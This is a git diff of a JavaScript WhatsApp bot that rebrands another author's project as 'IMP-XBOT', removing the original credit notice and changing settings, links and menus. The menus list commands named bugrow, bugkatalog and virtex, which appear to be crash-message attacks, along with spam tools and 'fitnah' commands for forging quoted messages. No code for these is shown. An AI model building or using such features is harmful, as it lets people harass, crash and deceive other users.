@@ -1,12 +1,3 @@
-///----------( Created By Denis Putra )----------\\\
-
-/**
-* Note:
-* Kalau Mau Recode/Reupload Kasih Credit
-**/
-
-///--------------------------------------------------------------\\\
-
 const
 	{
 	    WAConnection: _WAConnection,
@@ -98,26 +89,26 @@ const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
 ky_ttt = []
 tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
 cmhit = []
-autorespon = false
-antidelete = false
+autovn = true
+welcome = true
+antidelete = true
+menuall = false
 baterai = {
 battery: "" || "Tidak Terdeteksi",
 isCharge: "" || false
 }
-offline = false
-publik = false
-bugc = false
-waktuafk = 'Nothing'
-alasanafk = 'Nothing'
+offline = true
+publik = true
+bugc = true
+waktuafk = '1.51'
+alasanafk = 'Jangan ganggu lagi turu'
 NamaBot = settings.NamaBot
 NomorOwner = settings.NomorOwner
 NamaOwner = settings.NamaOwner
-multi =false
+multi =true
 nopref = false
-allpref = true
+allpref = false
 autoread = false
-autocomposing = false
-autorecording = false
 
 // APIKEY
 HunterApi = settings.HunterApi
@@ -311,11 +302,11 @@ try {
 		}
 		if (antibot === true) return
 		const katalog = (teks) => {
-             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Dcode Denpa_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© IMP-XBOT_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
              denz.relayWAMessage(res)
         }
         const grupinv = (teks) => {
-        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© IMP-XBOT_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
             denz.relayWAMessage(grup)
         }
 		idttt = []
@@ -337,6 +328,7 @@ try {
 		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 		      }
 		const ofrply = await getBuffer(pporang)
+		const pporigi = fs.readFileSync('./denz.jpg')
 		const sekarang = new Date().getTime();
 			//-
 			//WAKTU
@@ -394,7 +386,7 @@ key: {
 						"mimetype": "image/jpeg",
 						"jpegThumbnail": dfrply //Gambarnye
 					},
-					"title": `${tampilUcapan} ${pushname}`, //Kasih namalu 
+					"title": `ɪ ᴀᴍ ʙᴏᴏsᴛ `, //Kasih namalu 
 					"description": `${tampilUcapan} ${pushname}`, 
 					"currencyCode": "USD",
 					"priceAmount1000": "2000",
@@ -415,7 +407,7 @@ const ftrol = {
                             itemCount : 123,
                             status: 1,
                             surface : 1,
-                            message: `${tampilUcapan} ${pushname}`, //Kasih namalu
+                            message: `ɪ ᴀᴍ ʙᴏᴏsᴛ `, //Kasih namalu
                             orderTitle: `${tampilUcapan} ${pushname}`,
                             thumbnail: dfrply, //Gambarnye
                             sellerJid: '0@s.whatsapp.net' 
@@ -581,7 +573,7 @@ message: {
                             itemCount : 2021,
                             status: 1,
                             surface : 1,
-                            message: `Developed by Denis Putra`, //Kasih namalu
+                            message: `ɪ ᴀᴍ ʙᴏᴏsᴛ `, //Kasih namalu
                             thumbnail: fs.readFileSync('./media/image/icon.jpg'), //Gambarnye
                             sellerJid: '0@s.whatsapp.net' 
                           }
@@ -662,7 +654,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
             if (isAfk(mek.key.remoteJid)) return
             addafk(mek.key.remoteJid)
 			heheh = ms(Date.now() - waktuafk)
-		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© IMP-XBOT_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 			}
 		}
 		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
@@ -675,7 +667,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                         if (isAfk(mek.key.remoteJid)) return
                         addafk(mek.key.remoteJid)
 						heheh = ms(Date.now() - waktuafk)
-			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© IMP-XBOT_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 					}
 				}
 						}
@@ -739,7 +731,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
 	        denz.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
             }
 		const reply = (teks) => {
-			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285774523785?text=Assalamualaikum`}}})
 		}
 		const simir = (teks) => {
 			denz.sendMessage(from, teks, text, { quoted:ftrol })
@@ -900,32 +892,23 @@ return reply(parse)
 				reply('Link terdeteksi, Auto kick!')
 			    denz.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
 			}
-			}
-			if (!m.key.fromMe && bad.includes(messagesD)) {
-				reply('_Jangan Toxic!_')
-				}
-				if (!isGroup && !isCmd && !command && !mek.key.fromMe && autorespon) {
-simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=ID`)
-                     sami = simi.success
-                        denz.sendMessage(from, `${sami}`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek})
                       }
-if (autoread) {
+// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
+if (autovn) {
+	if (autovn === false) return
+await denz.updatePresence(from, Presence.recording)
+} 
+if (budy.startsWith('Denz')){
+sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© IMP-XBOT_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+}
+if (!settings.autoread) {
 denz.chatRead(from)
 }
-if (autocomposing) {
-denz.updatePresence(from, Presence.composing)
-}
-if (autorecording) {
-denz.updatePresence(from, Presence.recording)
-}
-if (budy.startsWith('Denz')){
-sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© Dcode Denpa_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
-}
 if(isButton == 'igm'){
-reply('http://instagram.com/dcodedenpa')
+reply('https://www.instagram.com/im_pos_ible990/')
 }
 if(isButton == 'ytm'){
-reply('http://youtube.com/dcodedenpa')
+reply('https://tinyurl.com/yg4k8bvg')
 }
 
    const sotoy = [
@@ -981,43 +964,22 @@ reply('http://youtube.com/dcodedenpa')
         reply(su)
 				}
         switch (command) {
-        	case 'menu':
-        case 'help':
-        stod = `${sender}`
-       stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
-				stst = stst.status == 401 ? '' : stst.status
-			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
-       menu = `❏「 \`\`\`${NamaBot}\`\`\` 」
-
-╾ _Creator : @${dtod.split('@')[0]}_
-╾ _Battery : ${baterai.battery}_
-╾ _Mode : ${publik ? 'Public' : 'Self'}_
-╾ _Total Hit : ${cmhit.length}_
-╾ _Command : ${prefix + command}_
-
-❏「 \`\`\`INFO BOT\`\`\` 」
-
-╾ _Nama Bot : ${NamaBot}_
-╾ _Nama Owner : ${NamaOwner}_
-╾ _Nomor Owner : @${otod.split('@')[0]}_
-╾ _Auto Composing : ${autocomposing}_
-╾ _Auto Recording : ${autorecording}_
-
-❏「 \`\`\`INFO USER\`\`\` 」
-
-╾ _Status : ${isOwner ? 'Owner' : 'User'}_
-╾ _Nama : ${pushname}_
-╾ _Bio : ${stst}_
-╾ _Nomor : @${stod.split('@')[0]}_
-╾ _Info Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}_`
-sendButDocument(from, `${menu}`, "*_© Dcode Denpa_*", fs.readFileSync('./sampah/Denpa'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/banner.jpg'), filename:`${jmn} - ${week} - ${calender}`}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {quoted:fmen, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${tampilUcapan} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/uQiF1yOnzDg`}}})
-break
-case 'command':
+case 'listmenu':
  stod = `${sender}`
  listMsg = {
  buttonText: 'LIST MENU',
- footerText: '*_© Dcode Denpa_*',
- description: `Hai kak @${stod.split('@')[0]}, Silahkan pilih menu disini`,
+ footerText: '*_© IMP-XBOT_*',
+ description: `> ⬡Creator : @${dtod.split('@')[0]}
+│> ⬡Battery : ${baterai.battery}
+│> ⬡Mode : ${publik ? 'Public' : 'Self'}
+│> ⬡Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
+│> ⬡Nomor Owner : @${otod.split('@')[0]}
+︎│> ⬡OS : ${os.platform()}
+❏「 \`\`\`INFO USER\`\`\` 」
+
+│> ⬡Status : ${isOwner ? 'Owner' : 'User'}_
+│> ⬡Nama : ${pushname}_
+│> ⬡Nomor : @${stod.split('@')[0]}_`,
  sections: [
                      {
                       "title": `${jmn} - ${week} ${weton} - ${calender}`,
@@ -1072,15 +1034,298 @@ case 'command':
 }
 denz.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
 break
+case 'menu': 
+stod = `${sender}`
+       stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
+       nama = 'MENU BOT INDO'
+       ownerJid = "6285774523785@s.whatsapp.net"
+				stst = stst.status == 401 ? '' : stst.status
+			
+menunya = `╭─❒ 「 Bot Info 」 ❒
+㊫ _Creator : *I AM.BOOST*
+㊫ _Battery : ${baterai.battery}_
+㊫ _Mode : ${publik ? 'Public' : 'Self'}_
+㊫ _Total Hit : ${cmhit.length}_
+㊫ _Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}_
+㊫ _Nama Bot : IMP-XBOT_
+㊫ _Nama Owner : ${NamaOwner}_
+㊫ _Nomor Owner : @${otod.split('@')[0]}_
+㊫ _Auto Recording : ${autovn}_
+└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱
+
+╭─❒ 「 User Info 」 ❒
+㊫ _Status : ${isOwner ? 'Owner' : 'User'}_
+㊫ _Nama : ${pushname}_
+㊫ _Bio : ${stst}_
+㊫ _Nomor : @${stod.split('@')[0]}_
+└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱
+
+┌❏ TO DAY
+│ ${tampilUcapan}
+㊫ Jam : ${jmn}
+㊫ Hari : ${week} ${weton}
+㊫ Tanggal : ${calender}
+└⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱
+
+╭─❒ COMMAND
+│
+㊫─❲ OWNER ❳─㊫ツ
+㊫ ${prefix}antidelete [ _on/off_ ]
+㊫ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
+㊫ ${prefix}tobc [ _reply sticker/audio with caption_ ]
+㊫ ${prefix}return [ _javascript_ ]
+㊫ ${prefix}clearall
+㊫ ${prefix}delchat
+㊫ ${prefix}mute
+㊫ ${prefix}unmute
+㊫ ${prefix}public
+㊫ ${prefix}self
+㊫ ${prefix}spam [ _teks|jumlah_ ]
+㊫ ${prefix}demoteall
+㊫ ${prefix}promoteall
+㊫ ${prefix}addcmd [ _teks reply stc_ ]
+㊫ ${prefix}delcmd [ _reply stc_ ]
+㊫ ${prefix}listcmd
+㊫ ${prefix}spamsw [ _teks|jumlah_ ]
+㊫ ${prefix}upswteks [ _teks_ ]
+㊫ ${prefix}upswlokasi [ _teks_ ]
+㊫ ${prefix}upswaudio [ _reply audio_ ]
+㊫ ${prefix}upswvoice [ _reply audio_ ]
+㊫ ${prefix}upswsticker [ _reply sticker_ ]
+㊫ ${prefix}upswimage [ _reply image with caption_ ]
+㊫ ${prefix}upswgif [ _reply gif with caption_ ]
+㊫ ${prefix}upswvideo [ _reply video with caption_ ]
+㊫ ${prefix}shutdown
+㊫ ${prefix}offline [ _alasan_ ]
+㊫ ${prefix}online
+㊫ ${prefix}exif [ _nama|author_ ]
+㊫ ${prefix}setprofile [ _reply image_ ]
+㊫ ${prefix}setname [ _teks_ ]
+㊫ ${prefix}setprefix [ _multi/nopref/prefix_ ]
+㊫ ${prefix}setbio [ _teks_ ]
+㊫ ${prefix}leave
+㊫ ${prefix}restart
+㊫ ${prefix}addrespon [ _tanya|jawab_ ]
+㊫ ${prefix}delrespon [ _nama_ ]
+㊫ ${prefix}listrespon
+㊫ ${prefix}readall
+㊫ ${prefix}unreadall
+㊫ ${prefix}archive
+㊫ ${prefix}unarchiveall
+㊫ ${prefix}pin
+㊫ ${prefix}unpin
+㊫ ${prefix}setmenu [ _ori/simpel_ ]
+㊫ ${prefix}setallmenu [ _ori/simpel_ ]
+㊫ ${prefix}leavetime [ _detik/menit/jam_ ]
+㊫ ${prefix}bukatime [ _detik/menit/jam_ ]
+㊫ ${prefix}tutuptime [ _detik/menit/jam_ ]
+㊫ ${prefix}nano [ _nama file_ ]
+│
+㊫─❲ NEW ❳─㊫ツ
+㊫ ${prefix}jadibot
+㊫ ${prefix}stopjadibot
+│
+㊫─❲ DOWNLOAD ❳─㊫ツ
+㊫ ${prefix}infogempa
+㊫ ${prefix}herolist
+㊫ ${prefix}herodetail [ _hero_ ]
+㊫ ${prefix}google [ _search_ ]
+㊫ ${prefix}gimage [ _search_ ]
+㊫ ${prefix}wiki [ _search_ ]
+㊫ ${prefix}mediafire [ _link_ ]
+㊫ ${prefix}ytsearch [ _judul_ ]
+㊫ ${prefix}ytmp4 [ _link yt_ ]
+㊫ ${prefix}ytmp3 [ _link yt_ ]
+㊫ ${prefix}play [ _judul lagu_ ]
+㊫ ${prefix}video [ _judul video_ ]
+㊫ ${prefix}tinyurl [ _link_ ]
+㊫ ${prefix}fetch [ _link_ ]
+㊫ ${prefix}igdl [ _link_ ]
+㊫ ${prefix}tiktokdl [ _link_ ]
+㊫ ${prefix}pinterest [ _search_ ]
+㊫ ${prefix}lirik [ _judul_ ]
+㊫ ${prefix}tourl [ _reply image/video_ ]
+㊫ ${prefix}resepmasakan [ _judul_ ]
+㊫ ${prefix}artimimpi [ _teks_ ]
+㊫ ${prefix}bilangangka [ _angka_ ]
+㊫ ${prefix}kalkulator [ _angka_ ]
+㊫ ${prefix}fancytext [ _teks_ ]
+㊫ ${prefix}githubstalk [ _username_ ]
+㊫ ${prefix}translate [ _teks kodebhs_ ]
+㊫ ${prefix}ss [ _link_ ]
+㊫ ${prefix}playstore [ _search_ ]
+㊫ ${prefix}tiktokaudio [ _link_ ]
+㊫ ${prefix}brainly [ _search_ ]
+㊫ ${prefix}igstory [ _search_ ]
+㊫ ${prefix}igstalk [ _link_ ]
+㊫ ${prefix}twitter [ _link_ ]
+㊫ ${prefix}twmp3 [ _link_ ]
+㊫ ${prefix}linkwa [ _search_ ]
+㊫ ${prefix}fb [ _link_ ]
+㊫ ${prefix}chara [ _search_ ]
+㊫ ${prefix}otaku [ _search_ ]
+㊫ ${prefix}komiku [ _search_ ]
+│
+㊫─❲ MAKER ❳─㊫ツ
+㊫ ${prefix}foliokanan [ _text_ ]
+㊫ ${prefix}foliokiri [ _text_ ]
+㊫ ${prefix}nuliskanan [ _text_ ]
+㊫ ${prefix}nuliskiri [ _text_ ]
+㊫ ${prefix}maker3d [ _text_ ]
+㊫ ${prefix}maker2d [ _text_ ]
+㊫ ${prefix}epepserti [ _text_ ]
+│
+㊫─❲ GROUP ❳─㊫ツ
+㊫ ${prefix}getpict [ _@tag_ ]
+㊫ ${prefix}getname [ _reply target_ ]
+㊫ ${prefix}getbio [ _reply target_ ]
+㊫ ${prefix}promote [ _@tag_ ]
+㊫ ${prefix}demote [ _@tag_ ]
+㊫ ${prefix}antilink [ _on/off_ ]
+㊫ ${prefix}antivirtex [ _on/off_ ]
+㊫ ${prefix}antiwame [ _on/off_ ]
+㊫ ${prefix}antibug [ _on/off_ ]
+㊫ ${prefix} welcome [ _on/off_ ]
+㊫ ${prefix}creategrup [ _nama|@tag_ ]
+㊫ ${prefix}tictactoe [ _@tag_ ]
+㊫ ${prefix}delttt
+㊫ ${prefix}getpp
+㊫ ${prefix}antiwame
+㊫ ${prefix}getdeskgc
+㊫ ${prefix}sider [ _reply pesan bot_ ]
+㊫ ${prefix}hacked [ _teks_ ]
+㊫ ${prefix}setnamegc [ _teks_ ]
+㊫ ${prefix}setdeskgc [ _teks_ ]
+㊫ ${prefix}fitnah [ _@tag|teks1|teks2_ ]
+㊫ ${prefix}kontak [ _@tag|nama_ ]
+㊫ ${prefix}kontag [ _@tag|nama_ ]
+㊫ ${prefix}opengc
+㊫ ${prefix}closegc
+㊫ ${prefix}resetlinkgc
+㊫ ${prefix}linkgrup
+㊫ ${prefix}hidetag [ _teks_ ]
+㊫ ${prefix}sticktag [ _nama sticker_ ]
+㊫ ${prefix}totag [ _reply media_ ]
+│
+㊫─❲ STICKER ❳─㊫ツ
+㊫ ${prefix}sticker
+㊫ ${prefix}stickerwm [ _nama|author_ ]
+㊫ ${prefix}takestick [ _nama|author_ ]
+㊫ ${prefix}colong [ _reply sticker_ ]
+㊫ ${prefix}dadu
+㊫ ${prefix}semoji [ _emoji_ ]
+㊫ ${prefix}attp [ _teks_ ]
+㊫ ${prefix}toimg
+㊫ ${prefix}tomp3 [ _reply video_ ]
+㊫ ${prefix}tomp4 [ _reply sticker gif_ ]
+㊫ ${prefix}robot [ _reply audio_ ]
+㊫ ${prefix}balik [ _reply audio_ ]
+㊫ ${prefix}bass [ _reply audio_ ]
+㊫ ${prefix}gemuk [ _reply audio_ ]
+㊫ ${prefix}detikvn [ _reply audio caption angka_ ]
+㊫ ${prefix}detikvideo [ _reply video caption angka_ ]
+│
+㊫─❲ ASUPAN ❳─㊫ツ
+㊫ ${prefix}asupan
+㊫ ${prefix}asupan2
+㊫ ${prefix}asupant3
+│
+㊫─❲ STORAGE ❳─㊫ツ
+㊫ ${prefix}listimage
+㊫ ${prefix}liststicker
+㊫ ${prefix}listvn
+㊫ ${prefix}addsticker [ _nama_ ]
+㊫ ${prefix}delsticker [ _nama_ ]
+㊫ ${prefix}addvn [ _nama_ ]
+㊫ ${prefix}delvn [ _nama_ ]
+㊫ ${prefix}addimage [ _nama_ ]
+㊫ ${prefix}delimage [ _nama_ ]
+│
+㊫─❲ JADI BOT ❳─㊫ツ
+㊫ ${prefix}stopjadibot
+㊫ ${prefix}jadibot
+│
+㊫─❲ EVAL ❳─㊫ツ
+㊫ *x*
+㊫ *>*
+㊫ *=>*
+㊫ *$*
+│
+㊫─❲ OTHER/FUN ❳─㊫ツ
+㊫ ${prefix}rate
+㊫ ${prefix}kapankah
+㊫ ${prefix}apakah
+㊫ ${prefix}bisakah
+㊫ ${prefix}caripesan [ _teks|jumlah_ ]
+㊫ ${prefix}slots
+㊫ ${prefix}suit [ _gunting/batu/kertas_ ]
+㊫ ${prefix}tag [ _nomor_ ]
+㊫ ${prefix}tagme
+㊫ ${prefix}tts [ _kodebhs teks_ ]
+㊫ ${prefix}readmore [ _teks1|teks2_ ]
+㊫ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]
+㊫ ${prefix}chat [ _nomor|teks_ ]
+㊫ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]
+㊫ ${prefix}listgrup
+㊫ ${prefix}baileys [ _reply message_ ]
+㊫ ${prefix}q [ _reply message_ ]
+㊫ ${prefix}getcaption [ _reply message_ ]
+㊫ ${prefix}pantun
+㊫ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]
+㊫ ${prefix}sharelock [ _teks1|teks2_ ]
+└─⊰᯽⊱┈────╌❊╌───┈⊰᯽⊱
+`
+if(menuall == false){
+   //Masih langka
+anu = denz.prepareMessageFromContent(from,{
+					"productMessage": {
+						"product": {
+								"productImage": {
+								 "url": "https://mmg.whatsapp.net/d/f/Ahb4wGLv5WRRHNDjX0oscWGguHSUTuBXrBLUDCzO0_0Z.enc",
+						"mimetype": "image/jpeg",
+						"fileSha256": "LxreCgbGFLCuMD0STZaaTDsyHuNg/s06FHXg9vm+qmo=",
+						"fileLength": "109459",
+						"height": 1280,
+						"width": 1274,
+						"mediaKey": "1SBZlmQxZQR+qZBVlBR5RcvDQNfYSRiYPT8uWDaEzLY=",
+						"fileEncSha256": "V6JNiialXPUGHn1j7Tz7YkXpU+QzOkBvOV7GZL2PRS4=",
+						"jpegThumbnail": fs.readFileSync("./denz.jpg")
+                                },
+                            "productId": "9999999",
+							"title": `${nama}`, 
+							"description": `${menunya}`,
+							"productImageCount": 1
+						},
+						"businessOwnerJid": `${ownerJid}`,
+						"contextInfo": {
+							"forwardingScore": 9999,
+							"isForwarded": true
+						}
+					}
+				},{quoted: ftrol, contextInfo: { mentionedJid: [dtod,otod,stod]}})
+                  denz.relayWAMessage(anu)
+                  } else if(menuall = true){
+gbutsan = [
+{buttonId:`donasi`,buttonText:{displayText:'TERIMA KASIH BANYAK'},type:1},
+{buttonId:`donasi`,buttonText:{displayText:'SUDAH MENGGUNAKAN'},type:1},
+{buttonId:`donasi`,buttonText:{displayText:'BOT INI DENGAN BAIK'},type:1}
+]
+mhan = await denz.prepareMessage(from, pporigi, image, {thumbnail: pporigi})
+const btnBngsat = {
+imageMessage: mhan.message.imageMessage,
+contentText: `${menunya}`,
+footerText: `IMP-XBOT`,
+buttons: gbutsan,
+headerType: 4
+}
+denz.sendMessage(from, btnBngsat, MessageType.buttonsMessage, { quoted: ftrol, caption: menunya, contextInfo: { mentionedJid: [dtod,otod,stod]}})
+                  }
+break
 case 'ownermenu':
 menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
 ├────────────────────
 ├ ${prefix}stopjadibot
-├ ${prefix}autorespon [ _on/off_ ]
-├ ${prefix}antidelete [ _on/off_ ]
-├ ${prefix}autoread [ _on/off_ ]
-├ ${prefix}fakevn [ _on/off_ ]
-├ ${prefix}fakengetik [ _on/off_ ]
+├ ${prefix}autovn 
 ├ ${prefix}bc [ _teks/reply gif/image/video with caption_ ]
 ├ ${prefix}tobc [ _reply sticker/audio with caption_ ]
 ├ ${prefix}return [ _javascript_ ]
@@ -1090,6 +1335,11 @@ menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
 ├ ${prefix}unmute
 ├ ${prefix}public
 ├ ${prefix}self
+├ ${prefix}bugrow
+├ ${prefix}bugbutton
+├ ${prefix}bugloc
+├ ${prefix}bugkatalog
+├ ${prefix}virtex
 ├ ${prefix}spam [ _teks|jumlah_ ]
 ├ ${prefix}demoteall
 ├ ${prefix}promoteall
@@ -1260,7 +1510,7 @@ katalog(menu)
 break
 case 'jadibot':
 client.version = [2, 2119, 6]
-client.browserDescription = ['Dcode Denpa','Desktop','3.0']
+client.browserDescription = ['IMP-XBOT','Desktop','3.0']
 if (args[0] && args[0].length > 200) {
 	let json = Buffer.from(args[0], 'base64').toString('utf-8')
     let obj = JSON.parse(json)
@@ -1313,7 +1563,7 @@ for (let i of ownerNumber) {
 const vname = denz.contacts[i] != undefined ? denz.contacts[i].vname || denz.contacts[i].notify : undefined
 ini_list.push({
 "displayName": `Developer ${NamaBot}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Dcode Denpa;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;IMP-XBOT;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 })
 }
 denz.sendMessage(from, {
@@ -1351,10 +1601,30 @@ teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
 }
 reply(teksnyee)
 break
+case 'setallmenu':
+if (!isOwner && !mek.key.fromMe) return sticOwner(from)
+if(args[0] == 'ori'){
+menuall = true
+reply('Sucsess')
+}else if(args[0] == 'simpel'){
+menuall = false
+reply('Sucsess')
+}else if (!c) {
+anu =`Silahkan pilih salah satu di bawah`
+ buttons = [{buttonId: 'setallmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setallmenu simpel', buttonText: {displayText: 'SIMPEL'}, type: 1}]
+const skuygf = {
+    contentText: `${anu}`,
+    footerText: '*_©kurr_*',
+    buttons: buttons,
+    headerType: 1
+}
+await denz.sendMessage(from, skuygf, MessageType.buttonsMessage, {quoted: ftrol})
+}
+break
 				case 'script':
 		case 'sc':
 		case 'sourcecode':
-		denz.sendMessage(from, { text: "https://github.com/dcode-denpa/bitch-boot", matchedText: 'https://github.com/dcode-denpa/bitch-boot', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
+		denz.sendMessage(from, { text: "https://tinyurl.com/yg4k8bvg", matchedText: 'https://tinyurl.com/yg4k8bvg', description: "", title: "Ngapain dek?", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
 		break
        case 'debug':
 			 res = await denz.prepareMessageFromContent(from,{
@@ -1599,19 +1869,21 @@ case 'fetch':
                     reply(mess.error.api)
                 }
                 break
-                case 'fakevn':
-      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
-       if (args.length < 1) return reply(`Penggunaan ${prefix}fakevn on/off`)
-           if (c === 'on'){
-             autorecording = true
-                    reply(`Berhasil mengaktifkan fakevn`)
-                } else if (c === 'off'){
-                    autorecording = false
-                    reply(`Berhasil menonaktifkan fakevn`)
-                } else {
-                    reply(mess.error.api)
-                }
-                break
+                case 'autovn':
+if (!isOwner && !mek.key.fromMe) return
+if (args.length < 1) return reply('Pilih on atau off')
+if (args[0] === "on") {
+if (autovn === true) return
+autovn = true
+reply(`Succes mengaktifkan autovn`)
+} else if (args[0] === "off") {
+if (autovn === false) return
+autovn = false
+reply(`Succes mematikan autovn`)
+} else {
+reply(`Pilih on atau off`)
+}
+break
                 case 'setprefix':
       if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (args.length < 1) return sendButMessage(from, `\`\`\`「 PREFIX SETTING 」\`\`\``, `Silahkan pilih salah satu`, [
@@ -2177,6 +2449,48 @@ emror = String(e)
 reply(`${e}`)
 }
 break
+case 'bitly':
+reply(mess.wait)
+if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
+short = args.join(" ")
